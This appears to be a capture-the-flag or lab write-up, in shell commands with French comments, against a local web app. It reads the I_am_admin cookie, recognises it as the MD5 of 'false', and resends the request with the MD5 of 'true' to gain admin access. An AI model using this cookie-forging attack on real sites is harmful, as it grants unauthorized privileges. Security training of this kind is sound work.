# Recuperer les cookies
curl -I http://127.0.0.1:8080 | grep -i set-cookie

# output
# Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Fri, 12-Dec-2025 14:35:04 GMT; Max-Age=3600


echo -n "68934a3e9455fa72420237eb05902327" | wc -c
# output : 32 

# hash MD5 (32 caractères hexadécimaux : 0-9, a-f).

echo -n "false" | md5sum
# Résultat : 68934a3e9455fa72420237eb05902327

echo -n "true" | md5sum
# Résultat : b326b5062b2f0e69046810717534cb09

# Set le cookie de I_am_admin a true 
curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09" http://127.0.0.1:8080